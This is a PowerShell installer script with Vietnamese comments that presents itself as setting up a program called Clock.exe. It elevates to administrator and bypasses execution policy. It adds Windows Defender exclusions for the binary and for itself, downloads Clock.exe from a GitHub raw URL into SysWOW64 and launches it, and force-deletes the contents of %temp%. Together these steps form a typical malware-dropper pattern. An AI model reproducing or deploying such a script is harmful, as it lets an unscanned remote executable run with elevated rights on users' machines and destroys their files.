# Kiểm tra nếu không có quyền admin
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    # Tạo đối tượng process mới và khởi chạy với quyền admin
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File ""$PSCommandPath"""
    Start-Process PowerShell -ArgumentList $arguments -Verb RunAs
    Exit
}

# Đường dẫn tệp gốc và đích
$source = "$env:TEMP\Clock.exe"
$source_install = "$env:TEMP\install.ps1"
$destination = "$env:SystemRoot\SysWOW64\Clock.exe"

Add-MpPreference -ExclusionPath $source
Add-MpPreference -ExclusionPath $source_install

# Lấy tất cả các tệp trong thư mục %temp%, trừ install.ps1
$itemsToDelete = Get-ChildItem -Path "$env:TEMP" | Where-Object { $_.Name -ne "install.ps1" }

# Hàm tắt Clock.exe nếu nó đang chạy
function Stop-ClockProcess {
    $processName = "Clock"
    $attempts = 0

    while ($attempts -lt 3) {
        $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if ($process) {
            Write-Host "Tắt Clock.exe - lần thứ $($attempts + 1)"
            Stop-Process -Name $processName -Force
            Start-Sleep -Seconds 1 # Đợi 1 giây trước khi tiếp tục
            $attempts++
        } else {
            Write-Host "Clock.exe không đang chạy, bỏ qua lần thứ $($attempts + 1)"
            $attempts++
        }
    }
}

# Gọi hàm để tắt Clock.exe 3 lần
Stop-ClockProcess

# Kiểm tra tệp nguồn có tồn tại không
If (Test-Path $source) {
    # Sao chép tệp, sử dụng tham số Force để ghi đè nếu tệp đã tồn tại
    Copy-Item -Path $source -Destination $destination -Force
    Write-Host "Tệp đã được sao chép thành công!"
} else {
    Write-Host "Tệp Clock.exe không tồn tại trong thư mục %temp%!"
    Write-Host "Đang thử tải xuống..."
    
    $url = "https://raw.githubusercontent.com/ahgm0/Clock24/main/Clock.exe"  # Thay thế bằng URL của tệp
    $output = "$env:TEMP\Clock.exe"
    $retryCount = 3
    $delay = 2  # Thời gian delay giữa các lần thử (giây)
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $output
            Write-Output "Tải Thành công"
            Copy-Item -Path $source -Destination $destination -Force
            break  # Nếu tải thành công, thoát khỏi vòng lặp
        }
        catch {
            Write-Error "Lần $($i+1) Thất bại: $_"
            if ($i -lt ($retryCount - 1)) {
                Write-Output "Thử lại sau $delay giây..."
                Start-Sleep -Seconds $delay  # Tạm dừng trước khi thử lại
            }
        }
    }

    if (!(Test-Path $output)) {
        Write-Error "Tải xuống thất bại sau $retryCount lần thử."
    }
}


Write-Host "Đang tiến hành xóa các tệp trong %temp% có thể xóa được..."
Start-Sleep -Seconds 1

# Xóa các tệp và thư mục
foreach ($item in $itemsToDelete) {
    try {
        Remove-Item -Path $item.FullName -Recurse -Force
        Write-Host "Đã xóa: $($item.FullName)"
    } catch {
        Write-Host "Không thể xóa: $($item.FullName). Lỗi: $_"
    }
}

Write-Host "Hoàn thành quá trình xóa các tệp và thư mục trong thư mục %temp%."


$seconds = 2
Write-Output "$seconds giây sau sẽ mở Clock..."
Start-Sleep -Seconds $seconds

# Mở Clock.exe
Write-Host "Đang mở Clock.exe..."
Start-Process -FilePath $destination
Write-Host "Đã mở Clock.exe!"

# Lệnh dừng yêu cầu người dùng nhấn Enter trước khi kết thúc
Read-Host -Prompt "Nhấn Enter để thoát"

exit 0
